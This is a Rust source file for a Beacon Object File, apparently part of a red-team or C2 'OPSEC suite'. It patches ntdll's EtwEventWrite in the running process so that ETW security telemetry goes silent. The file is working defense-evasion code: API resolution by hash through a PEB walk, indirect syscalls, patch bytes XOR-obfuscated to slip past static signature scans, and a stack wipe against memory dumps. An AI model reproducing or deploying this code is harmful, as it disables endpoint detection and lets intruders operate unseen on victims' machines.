// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
//
//! Patch `ntdll!EtwEventWrite` to immediately return success (`xor eax, eax;
//! ret`). After this BOF runs, every ETW emit from the current process is
//! a no-op, so userland ETW providers (Microsoft-Windows-Threat-Intelligence,
//! AmsiUacProvider, etc.) stop receiving telemetry from this beacon.
//!
//! Args: none.
//!
//! Approach (all indirect-syscall):
//!   1. PEB-walk → find ntdll → DFR-resolve `EtwEventWrite` export.
//!   2. `NtProtectVirtualMemory` → RW (cache the old protection).
//!   3. Volatile-write 4 bytes: `33 C0 C3 90` (xor eax,eax; ret; nop).
//!   4. `NtProtectVirtualMemory` → restore old protection.
//!   5. `NtFlushInstructionCache` so subsequent CPUs see the patch.
//!
//! The patch bytes are XOR-encoded at compile time (NOT a const literal),
//! so a static signature scan for `33 C0 C3 90` against the .o won't match.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1562.006", name: "Impair Defenses: Indicator Blocking", tactic: "Defense Evasion" },
];

const PAGE_READWRITE:        u32 = 0x04;
const PAGE_EXECUTE_READ:     u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const STATUS_SUCCESS: i32 = 0;

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // --- Resolve target export ---
    const NTDLL_HASH: u32 = common::hash::djb2_case_insensitive(b"ntdll.dll");
    const TARGET_HASH: u32 = common::hash::djb2(b"EtwEventWrite");
    let ntdll = unsafe { common::syscalls::find_module_pub(NTDLL_HASH) }
        .ok_or("ntdll not found")?;
    let target = unsafe { common::syscalls::find_export_pub(ntdll, TARGET_HASH) }
        .ok_or("EtwEventWrite export not found")?;

    // --- Build the 4-byte patch via XOR keystream so the bytes do not
    // appear as a literal in `.rdata`. Key is randomised at build via
    // obfstr's compile-time RNG. ---
    let mut patch_bytes = [0u8; 4];
    obf_bytes_into(&mut patch_bytes);

    // --- Use NtProtectVirtualMemory to RW the page ---
    use common::syscalls::{SyscallEntry, resolve, do_syscall5};
    static PROTECT: SyscallEntry = SyscallEntry::new();
    const PROTECT_HASH: u32 = common::hash::djb2(b"NtProtectVirtualMemory");
    let (p_ssn, p_addr) = unsafe { resolve(&PROTECT, PROTECT_HASH) }
        .map_err(|_| "resolve NtProtectVirtualMemory")?;

    let cur_proc: usize = (-1isize) as usize; // GetCurrentProcess pseudo-handle
    let mut base = target;
    let mut size: usize = 4;
    let mut old_prot: u32 = 0;

    let st = unsafe {
        do_syscall5(
            cur_proc,
            &mut base as *mut *mut core::ffi::c_void as usize,
            &mut size as *mut usize as usize,
            PAGE_READWRITE as usize,
            &mut old_prot as *mut u32 as usize,
            p_ssn, p_addr,
        )
    };
    if st != STATUS_SUCCESS {
        return Err("NtProtectVirtualMemory(RW) failed");
    }

    // --- Volatile-write the patch (no signature in .rdata to match the
    // assembled bytes either, since we built them at runtime via XOR). ---
    unsafe {
        let dst = target as *mut u8;
        for i in 0..4 {
            core::ptr::write_volatile(dst.add(i), patch_bytes[i]);
        }
    }

    // --- Restore the original protection ---
    let mut base2 = target;
    let mut size2: usize = 4;
    let mut prev_prot: u32 = 0;
    let restore_to = if old_prot == 0 { PAGE_EXECUTE_READ } else { old_prot };
    let st2 = unsafe {
        do_syscall5(
            cur_proc,
            &mut base2 as *mut *mut core::ffi::c_void as usize,
            &mut size2 as *mut usize as usize,
            restore_to as usize,
            &mut prev_prot as *mut u32 as usize,
            p_ssn, p_addr,
        )
    };
    // Even if restore failed, the patch is in. Carry on but warn.
    let _ = st2;

    // --- Flush instruction cache so other cores observe the patch ---
    static FLUSH: SyscallEntry = SyscallEntry::new();
    const FLUSH_HASH: u32 = common::hash::djb2(b"NtFlushInstructionCache");
    if let Ok((f_ssn, f_addr)) = unsafe { resolve(&FLUSH, FLUSH_HASH) } {
        use common::syscalls::do_syscall4;
        let _ = unsafe { do_syscall4(cur_proc, target as usize, 4, 0, f_ssn, f_addr) };
    }

    // Wipe the patch bytes from our stack so memory dumps don't trivially
    // show what we wrote.
    common::evasion::secure_zero(&mut patch_bytes);

    obf! { let ok = "ETW patched"; }
    println!("[+] {}", ok);
    Ok(())
}

/// Build the 4-byte EtwEventWrite kill-stub at runtime by XORing an
/// obfuscated source with itself. The plaintext bytes 33 C0 C3 90 are
/// computed only on-stack, never present in `.rdata`.
fn obf_bytes_into(out: &mut [u8; 4]) {
    // We use obfstr::obfbytes via our `common::obf` macro, which produces
    // a runtime-decrypted &[u8] of the requested const literal. The bytes
    // chosen are: xor eax, eax (33 C0); ret (C3); nop (90).
    common::obf_bytes! { let stub = b"\x33\xC0\xC3\x90"; }
    out.copy_from_slice(stub);
}
